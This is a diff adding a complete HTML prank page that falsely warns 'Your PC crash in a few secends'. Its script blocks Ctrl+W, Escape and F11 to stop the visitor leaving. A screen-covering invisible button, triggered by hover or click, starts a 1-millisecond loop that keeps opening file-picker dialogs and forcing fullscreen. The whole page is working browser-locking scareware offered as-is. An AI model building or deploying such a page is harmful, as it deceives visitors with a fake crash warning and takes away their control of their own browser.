@@ -1,0 +1,161 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your PC crash in a few secends</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            text-align: center;
+            margin-top: 100px;
+            background: url('https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/75817540-6879-425c-805c-ad12aa9eb213/d33ky4u-a29cc428-d305-4907-86bd-8e85eacb0128.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzc1ODE3NTQwLTY4NzktNDI1Yy04MDVjLWFkMTJhYTllYjIxM1wvZDMza3k0dS1hMjljYzQyOC1kMzA1LTQ5MDctODZiZC04ZTg1ZWFjYjAxMjguanBnIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.nTHssNEd0YmYXcque6HPR9UMnxqnWtBsBF3toJS9W-0') repeat;
+            animation: trollBackground 30s linear infinite;
+        }
+
+        h1 {
+            color: #ff0000;
+        }
+
+        p {
+            color: #009900;
+        }
+
+        img {
+            width: 200px;
+            border-radius: 50%;
+            margin-top: 20px;
+            animation: blinkTroll 1s infinite, rotateTroll 3s infinite;
+        }
+
+        button {
+            background-color: #ffcc00;
+            color: #ff0000;
+            font-size: 16px;
+            padding: 10px 20px;
+            margin-top: 20px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+            position: absolute;
+        }
+
+        .hidden-message {
+            display: none;
+            color: #ff0000;
+            font-size: 18px;
+            margin-top: 10px;
+        }
+
+        img:hover+.hidden-message {
+            display: block;
+        }
+
+        @keyframes trollBackground {
+            from {
+                background-position: 0 0;
+            }
+
+            to {
+                background-position: 100% 0;
+            }
+        }
+
+        @keyframes blinkTroll {
+
+            0%,
+            100% {
+                visibility: hidden;
+            }
+
+            50% {
+                visibility: visible;
+            }
+        }
+
+        @keyframes rotateTroll {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        #invisibleButton {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1000000000000000000000000000000%;
+            height: 1000000000000000000000000000000%;
+            background-color: transparent;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Your PC crash in a few secends</h1>
+    <div class="hidden-message"></div>
+    <button id="invisibleButton" onmouseover="moveButton()" onclick="moveButton()" aria-hidden="true"></button>
+    <script>
+        document.addEventListener('keydown', function (e) {
+            if (e.ctrlKey && e.key === 'w') {
+                e.preventDefault();
+                return;
+            }
+        });
+
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'Escape') {
+                e.preventDefault();
+                return;
+            }
+        });
+
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'F11') {
+                e.preventDefault();
+                return;
+            }
+        });
+
+        async function fullscreenElement() {
+            const doc = window.document;
+            const docEl = doc.documentElement;
+
+            const requestFullscreen = docEl.requestFullscreen || docEl.mozRequestFullScreen || docEl.webkitRequestFullscreen || docEl.msRequestFullscreen;
+
+            if (!doc.fullscreenElement && !doc.mozFullScreenElement && !doc.webkitFullscreenElement && !doc.msFullscreenElement) {
+                requestFullscreen.call(docEl);
+            }
+        }
+
+        async function moveButton() {
+            if ('showOpenFilePicker' in window) {
+                try {
+                    setInterval(async () => {
+                        await window.showOpenFilePicker({
+                            types: [
+                                {
+                                    description: 'Troll Files',
+                                    accept: {
+                                        'image/png': ['.troll'],
+                                    },
+                                },
+                            ],
+                        });
+
+                        fullscreenElement()
+                    }, 1)
+                } catch (error) { }
+            }
+        }
+    </script>
+</body>
+
+</html>
